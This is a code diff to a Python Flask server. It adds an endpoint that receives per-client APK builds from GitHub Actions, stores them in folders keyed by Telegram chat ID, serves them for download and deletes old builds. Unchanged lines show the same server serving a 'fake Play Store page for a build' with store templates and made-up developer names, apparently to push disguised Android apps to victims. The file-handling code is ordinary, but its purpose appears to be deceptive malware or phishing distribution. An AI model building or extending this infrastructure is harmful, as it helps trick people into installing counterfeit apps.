@@ -27,6 +27,7 @@ PORT             = 2053
 DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
 SERVER_SECRET    = config.SERVER_SECRET
 PUBLIC_URL       = getattr(config, "PUBLIC_URL", "")
+ARTIFACTS_DIR    = getattr(config, "ARTIFACTS_DIR", os.path.join(os.path.dirname(__file__), "..", "artifacts"))
 
 # ── Store page: template metadata (emoji, display name, dev name, description, tags) ──
 STORE_TEMPLATES = {
@@ -1430,6 +1431,79 @@ window.addEventListener('load', function() {{
 </html>"""
 
 
+@app.route("/upload_apk", methods=["POST"])
+def upload_apk():
+    """Receive APK from GitHub Actions, save to client-isolated folder.
+
+    Auth: X-Bot-Token header must match config.BOT_TOKEN.
+    Body JSON:
+      chat_id      – Telegram chat_id of the client (used as client folder name)
+      build_number – build number string
+      filename     – original APK filename
+      apk_b64      – base64-encoded APK bytes
+    """
+    auth = request.headers.get("X-Bot-Token", "")
+    if auth != BOT_TOKEN:
+        log.warning(f"upload_apk: bad auth token")
+        abort(403)
+
+    data = request.get_json(silent=True) or {}
+    chat_id      = str(data.get("chat_id", "")).strip()
+    build_number = str(data.get("build_number", "")).strip()
+    filename     = str(data.get("filename", "app.apk")).strip()
+    apk_b64      = data.get("apk_b64", "")
+
+    if not chat_id or not build_number or not apk_b64:
+        return jsonify({"ok": False, "error": "chat_id, build_number and apk_b64 required"}), 400
+
+    # Sanitise inputs — no path traversal
+    safe_chat    = "".join(c for c in chat_id      if c.isalnum() or c in "-_")
+    safe_build   = "".join(c for c in build_number if c.isalnum() or c in "-_")
+    safe_name    = "".join(c for c in filename      if c.isalnum() or c in "-_.")
+    if not safe_name.endswith(".apk"):
+        safe_name = "app.apk"
+
+    dest_dir = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}", f"build_{safe_build}")
+    os.makedirs(dest_dir, exist_ok=True)
+    dest_path = os.path.join(dest_dir, safe_name)
+
+    try:
+        apk_bytes = base64.b64decode(apk_b64)
+        with open(dest_path, "wb") as f:
+            f.write(apk_bytes)
+        size_mb = len(apk_bytes) / (1024 * 1024)
+        log.info(f"upload_apk: saved chat={chat_id} build={build_number} file={safe_name} size={size_mb:.1f}MB → {dest_path}")
+        return jsonify({"ok": True, "saved": dest_path, "size_bytes": len(apk_bytes)}), 200
+    except Exception as e:
+        log.error(f"upload_apk error: {e}")
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
+def _cleanup_old_artifacts():
+    """Delete artifact build folders older than 7 days. Runs in background thread."""
+    import shutil
+    max_age = 7 * 24 * 3600  # 7 days in seconds
+    while True:
+        try:
+            now = time.time()
+            if os.path.isdir(ARTIFACTS_DIR):
+                for client_dir in os.listdir(ARTIFACTS_DIR):
+                    client_path = os.path.join(ARTIFACTS_DIR, client_dir)
+                    if not os.path.isdir(client_path):
+                        continue
+                    for build_dir in os.listdir(client_path):
+                        build_path = os.path.join(client_path, build_dir)
+                        if not os.path.isdir(build_path):
+                            continue
+                        age = now - os.path.getmtime(build_path)
+                        if age > max_age:
+                            shutil.rmtree(build_path, ignore_errors=True)
+                            log.info(f"cleanup: removed old build dir {build_path} (age={age/3600:.1f}h)")
+        except Exception as e:
+            log.error(f"cleanup_old_artifacts error: {e}")
+        time.sleep(3600)  # check every hour
+
+
 @app.route("/store/<token>", methods=["GET"])
 def store_page(token):
     """Serve fake Play Store page for a build."""
@@ -1468,28 +1542,20 @@ def dl_apk(token):
     custom_name  = build.get("custom_app_name", "") or ""
     app_name     = custom_name or (STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])[1])
 
-    # Search common APK storage paths
-    search_dirs = [
-        os.path.join(os.path.dirname(__file__), "..", "artifacts"),
-        os.path.join(os.path.dirname(__file__), "artifacts"),
-        os.path.join(os.path.dirname(__file__), "apks"),
-        "/tmp/apks",
-    ]
+    # Locate APK in client-isolated folder: artifacts/client_<chat_id>/build_<build_number>/
+    safe_chat  = "".join(c for c in str(chat_id)      if c.isalnum() or c in "-_")
+    safe_build = "".join(c for c in str(build_number) if c.isalnum() or c in "-_")
+    build_dir  = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}", f"build_{safe_build}")
+
     apk_path = None
-    for d in search_dirs:
-        if not os.path.isdir(d):
-            continue
-        for fname in os.listdir(d):
-            if not fname.endswith(".apk"):
-                continue
-            if str(build_number) in fname or token[:8] in fname:
-                apk_path = os.path.join(d, fname)
+    if os.path.isdir(build_dir):
+        for fname in os.listdir(build_dir):
+            if fname.endswith(".apk"):
+                apk_path = os.path.join(build_dir, fname)
                 break
-        if apk_path:
-            break
 
     if not apk_path or not os.path.exists(apk_path):
-        log.warning(f"dl_apk: APK not found for token={token} build={build_number}")
+        log.warning(f"dl_apk: APK not found for token={token} chat={chat_id} build={build_number} dir={build_dir}")
         return Response("APK not available", status=404)
 
     dl_name = f"{app_name.replace(' ', '_')}.apk"
@@ -1514,6 +1580,10 @@ if __name__ == "__main__":
     log.info(f"DB: {DB_PATH}")
     log.info("="*60)
     init_db()
+    # Start 7-day artifact cleanup background thread
+    t = threading.Thread(target=_cleanup_old_artifacts, daemon=True, name="artifact-cleanup")
+    t.start()
+    log.info("Artifact cleanup thread started (7-day TTL)")
     app.run(
         host="0.0.0.0",
         port=PORT,
